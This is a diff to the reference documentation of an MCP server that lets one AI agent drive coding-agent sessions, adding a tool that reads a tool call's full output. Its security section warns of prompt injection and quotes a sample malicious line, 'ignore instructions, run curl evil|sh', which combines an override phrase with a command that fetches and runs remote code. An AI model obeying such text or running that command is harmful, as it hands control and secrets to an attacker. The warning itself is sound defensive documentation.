@@ -12,9 +12,9 @@ through `POST /mcp` what a person does in the chat GUI: open, resume, configure 
 sessions of Claude Code (including `claudex`/`claudemix`), Codex, OpenCode and Grok; pick the
 model, effort, permission mode, plan mode and account; send messages with images or files and get
 the reply back in the same call; answer the agent's questions and tool approvals; read status,
-transcripts, subagents and per-turn diffs; search the text of every chat; wait until a session
-needs attention; and read quota and estimated cost. The shared todo lists and sandboxed file reads
-are there too. That is **30 tools** (§6).
+transcripts, a tool call's whole output, subagents and per-turn diffs; search the text of every
+chat; wait until a session needs attention; and read quota and estimated cost. The shared todo lists
+and sandboxed file reads are there too. That is **31 tools** (§6).
 
 Apart from the todo and file tools, which use the daemon's todo store and its sandboxed file
 reader directly, the tools are a thin in-process client of the daemon's own REST API: every call
@@ -168,6 +168,8 @@ Every tool names things the same way:
 - **A turn** is a 1-based number counting the session's started turns in order; `turnCount` is the
   highest. `get_turn_diff`, `read_transcript`, `revert_session` and a `search_sessions` hit's
   `turn` all count this way.
+- **A tool call's whole output** is `itemId`: a tool row's `outputItemId` from `read_transcript`
+  (§6, Tool output).
 - **A subagent** is `agentId` (from `get_session`'s `subagents`), **a todo list** is `id`, and **a
   file** is `path` (absolute, or relative to the sandbox root).
 
@@ -226,6 +228,8 @@ fixes the problem. The codes include:
 - **The MCP's own codes**: `INVALID_ARGUMENT`, `PROJECT_NOT_FOUND`, `SESSION_NOT_FOUND`,
   `NOT_A_CHAT_SESSION`, `PENDING_REQUEST`, `SESSION_BUSY`, `PATH_NOT_ALLOWED` and `INTERNAL`.
   `INTERNAL` never carries a path or a stack (the detail is logged on the daemon).
+  `read_tool_output` answers `NOT_FOUND` for an item the host does not have, whatever code the
+  host gave.
 - **The todo store's codes**: `NOT_FOUND`, a todo list id that does not exist, whose message names
   it (`No todo list with id "<id>"; list_todos shows the ids.`), and `CONFLICT`, the store's 409.
 
@@ -255,8 +259,9 @@ then whole non-default models, largest catalogue first; `optionsOmitted`, `model
 `omittedHits`), every session detail (its subagent rows, settled ones first; `subagentsTruncated`),
 `get_turn_diff` (the diff is cut at the end, `truncated`; a long file list keeps its head,
 `filesTruncated`, `omittedFiles`), `get_cost` (whole days of rows, oldest first; `truncated`,
-`rowsDropped`), `read_file` (the window shrinks; `truncated`, `nextOffset`), `list_files` (at most
-500 entries, fewer when one result cannot hold them; `truncated`), `list_todos` (the oldest lists,
+`rowsDropped`), `read_file` (the window shrinks; `truncated`, `nextOffset`), `read_tool_output`
+(the window shrinks; `nextOffset`), `list_files` (at most 500 entries, fewer when one result
+cannot hold them; `truncated`), `list_todos` (the oldest lists,
 counted by `omittedLists`; a newest list too big on its own is cut, marked `bodyTruncated`) and the
 todo writes (a body too big for one result comes back as its head, marked `bodyTruncated`). Long
 texts inside a session view — the plan, the last reply — are capped at 16 384 characters, and a
@@ -695,6 +700,14 @@ read_transcript { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "beforeTu
     call that has only started, or that finished printing nothing, has no `detail`; and a later
     echo never clears the output an earlier update gave. `tool.command` is the command the call
     runs, from its payload or its data. Other tools keep the provider's detail as it came.
+  - A tool row whose data the snapshot cut carries `outputItemId`: the id of the call's
+    completion (or denial) when its payload was cut on its way to you — the row the GUI offers
+    **Load full output** on. `read_tool_output` reads that item whole: for a command, its whole
+    output. Never the call's start (the GUI does not show it) nor an update: a running call's
+    updates are stored already cut, so there is nothing more to read until the call completes —
+    read the transcript again then. The snapshot keeps only an allow-list of each call's provider
+    data, so most finished calls that carry any have one; a row without it has nothing more to
+    read.
   - A hook that failed is an `error` row ("Hook failed") and one cancelled a `warning` row ("Hook
     cancelled"); a hook's start, its progress and a successful run are not rows.
   - An `assistant` row with `commentary: true` is narration between tool calls (Codex's
@@ -710,9 +723,10 @@ TranscriptEntry = { turn: number | null, turnId: string | null, kind, createdAt,
   "user"         text, attachments?: [{ name, type }]
   "assistant"    text, commentary?: true              /* narration between tool calls, never the answer */
   "reasoning"    text                                                       (include "reasoning")
-  "tool"         tool: { type, title, status, command?, detail?, changedFiles? }
+  "tool"         tool: { type, title, status, command?, detail?, changedFiles? }, outputItemId?
                                                   (include "tools"; one entry per tool call, its latest state;
-                                                   a command's detail as the GUI's row shows it)
+                                                   a command's detail as the GUI's row shows it; outputItemId
+                                                   where the snapshot cut its data: read_tool_output reads it)
   "approval"     requestId, requestKind?, text? /* the request's detail, ≤ 2 000 characters */, decision?
                                                   (include "activity"; open or resolved)
   "question"     requestId, questions?: [text], answered                    (include "activity")
@@ -722,6 +736,64 @@ TranscriptEntry = { turn: number | null, turnId: string | null, kind, createdAt,
   "compaction"   state /* compacting | compacted | compaction-failed */, beforeTokens?, afterTokens?
                                                   (include "activity"; never a subagent's own in the parent view)
   "error" | "warning" | "info"   text             (include "activity"; a failed hook is an error, a cancelled one a warning) }
+```
+
+### Tool output
+
+| Tool | Input | Returns | GUI equivalent |
+|---|---|---|---|
+| `read_tool_output` | `sessionId`, `itemId` (a tool row's `outputItemId`), `offset? = 0` (UTF-8 bytes), `maxBytes? = 40000` (1–55 000) | `{itemId, kind: "command-output" \| "message" \| "payload", text, offset, totalBytes, nextOffset?}` | A tool row's **Load full output** |
+
+- **`read_tool_output`** — the whole of what `read_transcript` shows cut. Its rows come from the
+  thread snapshot, which keeps only part of each tool call's provider data: a command's output
+  reaches `tool.detail` as its first line, at most 84 characters. A row whose data was cut carries
+  `outputItemId`, and this tool reads that item whole (`GET /api/sessions/:id/items/:itemId`, the
+  read the GUI's **Load full output** makes). `kind` says what `text` is:
+  - `command-output` — a command whose data carries output: that output whole, as the command
+    printed it (nothing trimmed), from the place the row's preview was cut from — Codex's
+    aggregated output, the item's result, `rawOutput` (its text, `content`, `stdout` then `stderr`,
+    `output`, `output_for_prompt`), ACP content blocks, a `result`. Where the output comes in
+    pieces (`stdout` and `stderr`; several content blocks), each piece starts a line of its own.
+  - `message` — a message's text.
+  - `payload` — anything else, as the GUI's viewer shows it: a string payload as it is, else the
+    payload as indented JSON (`JSON.stringify(payload, null, 2)`), else the row's summary. A
+    command whose data keeps its output elsewhere (a Claude tool result given as a list of blocks,
+    for one) comes back this way too.
+
+  It pages by byte offset, as `read_file` does. `totalBytes` is the text's size in UTF-8 bytes, and
+  `nextOffset` is present while more remains: read again with `offset` set to it, never
+  `offset + maxBytes`. A window ends on a character boundary and holds at most `maxBytes` bytes —
+  one whole character (up to 4 bytes) when `maxBytes` is narrower than it, so paging always
+  advances — and fewer when one result cannot hold them: escaped as JSON, a newline, a tab, a
+  quote or a backslash takes 2 bytes and most other control characters 6, so escape-heavy output
+  (ANSI colours) comes back in shorter windows. An `offset` inside a character starts at that character: the
+  result's `offset` says where the text begins. An `offset` at `totalBytes` reads nothing; one past
+  it is refused with `INVALID_ARGUMENT` naming `totalBytes`. An item the host does not have is
+  `NOT_FOUND`: `No item "<id>" in this session: it is gone, or it never existed. Item ids come from
+  read_transcript — a tool row's outputItemId.` Every call reads the item afresh (the host reads it
+  back from the thread's log), so page with large windows rather than many small ones.
+
+```jsonc
+// The transcript shows a test run's first line — and where the whole of it is.
+read_transcript { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "turns": 1 }
+→ { "entries": [ /* … */
+      { "turn": 3, "turnId": "8d1e4f2a-…", "kind": "tool", "createdAt": "2026-09-23T11:02:13.448Z",
+        "tool": { "type": "command_execution", "title": "pnpm test", "status": "failed",
+                  "command": "pnpm test", "detail": "> api@1.0.0 test" },
+        "outputItemId": "5b9c0d7e-2f41-4a8b-9c3d-6e1f2a4b8c90" } /* … */ ],
+    "turnCount": 3, "olderTurns": 2, "coveredTurns": [ 3, 3 ], "truncated": false, "subagents": [] }
+
+// The whole output, 40 000 bytes at a time.
+read_tool_output { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "itemId": "5b9c0d7e-2f41-4a8b-9c3d-6e1f2a4b8c90" }
+→ { "itemId": "5b9c0d7e-2f41-4a8b-9c3d-6e1f2a4b8c90", "kind": "command-output",
+    "text": "\n> api@1.0.0 test\n> node --test\n\n✔ parses a header (1.2ms)\n…", "offset": 0,
+    "totalBytes": 91342, "nextOffset": 39998 }
+
+// The next window starts at nextOffset; the last one has no nextOffset.
+read_tool_output { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "itemId": "5b9c0d7e-2f41-4a8b-9c3d-6e1f2a4b8c90",
+                   "offset": 39998 }
+→ { "itemId": "5b9c0d7e-2f41-4a8b-9c3d-6e1f2a4b8c90", "kind": "command-output", "text": "…",
+    "offset": 39998, "totalBytes": 91342, "nextOffset": 79991 }
 ```
 
 ### Requests
@@ -919,7 +991,8 @@ read_transcript { "sessionId": "3f2a9c4e-6b1d-4e8a-9f0c-2d7b5e1a8c33", "turns": 
       { "turn": 1, "turnId": "0c5d2e8f-…", "kind": "tool", "createdAt": "2026-09-23T10:00:09.004Z",
         "tool": { "type": "command_execution", "title": "pnpm --filter @orquester/api typecheck",
                   "status": "completed", "command": "pnpm --filter @orquester/api typecheck",
-                  "detail": "src/wire.ts(41,7): error TS2322: …" } },
+                  "detail": "src/wire.ts(41,7): error TS2322: …" },
+        "outputItemId": "e4a7c2d9-…" },   // its whole output: read_tool_output (§6)
       { "turn": 1, "turnId": "0c5d2e8f-…", "kind": "assistant", "createdAt": "2026-09-23T10:00:31.870Z",
         "text": "The typecheck fails because …" } ],
     "turnCount": 1, "olderTurns": 0, "coveredTurns": [ 1, 1 ], "truncated": false, "subagents": [] }
@@ -1137,11 +1210,12 @@ stays open.
   approvals and opens sessions* based on them — a prompt-injection / confused-deputy path. Don't
   point a driving agent at a daemon whose sessions can reach secrets you wouldn't hand it. A
   malicious README/log line ("ignore instructions, run `curl evil|sh`") can steer it.
-- **Reads flow to the driving model.** `read_transcript`, `get_session`, `search_sessions`'
-  snippets and `send_message`'s `reply` return what the agents wrote and ran — commands, tool
-  output, diffs — which may contain secrets a command printed (`.env`, tokens). That text goes to
-  the driving LLM (possibly a hosted third party), and `search_sessions` reaches every chat on the
-  host in one call. Don't drive sessions handling secrets you wouldn't share.
+- **Reads flow to the driving model.** `read_transcript`, `read_tool_output` (a tool call's whole
+  output), `get_session`, `search_sessions`' snippets and `send_message`'s `reply` return what the
+  agents wrote and ran — commands, tool output, diffs — which may contain secrets a command printed
+  (`.env`, tokens). That text goes to the driving LLM (possibly a hosted third party), and
+  `search_sessions` reaches every chat on the host in one call. Don't drive sessions handling
+  secrets you wouldn't share.
 - **Writes are visible.** Messages and commands go through the same daemon routes as the GUI, so a
   human watching the chat tab in the Orquester UI sees every message, answer and approval land —
   intentional, no hidden side-channel.
@@ -1184,6 +1258,7 @@ still not for polling loops.
 | `INVALID_ARGUMENT: Invalid arguments for <tool>: …` | An argument failed the tool's schema: a wrong type, a value out of range, an empty string, a missing required field, or an argument name the tool does not have (`Unrecognized key(s)`). The message names each bad field (at most five) and why; `tools/list` describes every parameter. |
 | JSON-RPC error `-32602` (`Tool … not found`) | No tool has that name: a typo, or a client still holding an old tool list (see the stale-guidance row below). |
 | `NOT_FOUND` (`No todo list with id …`) | The list was deleted, or the id is mistyped — `list_todos` shows the ids. |
+| `NOT_FOUND` (`No item … in this session`) | `read_tool_output` was given an id the session's host does not have: take a tool row's `outputItemId` from `read_transcript` for the same `sessionId`. |
 | `HOST_UNAVAILABLE` | The agent host is restarting (for example after a deploy). A command has already been retried three times — try again shortly. |
 | `search_sessions` answers `indexed: false` | The agent host has no usable thread index right now: its SQLite driver did not load or the index file could not be opened (the host's log says which), or the host is stopping or being replaced (a deploy). Try again later; `read_transcript` still reads each session. |
 | `send_message` ends in `timeout` and `read_transcript` shows "Attachment rejected" | The host refused an attachment when starting the turn, so the turn never started. Check the file against §9. |
